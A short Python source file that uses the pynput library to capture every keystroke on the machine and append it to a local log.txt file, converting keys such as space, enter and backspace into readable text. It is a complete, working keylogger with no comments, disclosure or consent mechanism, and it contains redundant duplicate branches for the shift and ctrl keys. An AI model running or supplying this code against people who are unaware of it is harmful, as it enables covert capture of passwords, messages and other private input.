from pynput.keyboard import Listener


def writekey(key):
	keydata = str(key)
	keydata = keydata.replace("'","")

	if keydata == "Key.space":
		keydata = " "

	elif keydata == "Key.enter":
		keydata = "\n"

	elif keydata == "Key.shift":
		keydata = ""

	elif keydata == "Key.shift":
		keydata = ""

	elif keydata == "Key.print_screen":
		keydata = "<screen_short>"

	elif keydata == "Key.backspace":
		keydata = "<backspace>"

	elif keydata == "Key.caps_lock":
		keydata = "<cap>"

	elif keydata == "Key.ctrl_l":
		keydata = ""

	elif keydata == "Key.ctrl_l":
		keydata = ""

	elif keydata == "Key.tab":
		keydata = "    "
	with open("log.txt",'a') as f:
		f.write(keydata)

with Listener(on_press=writekey) as l:
	l.join()
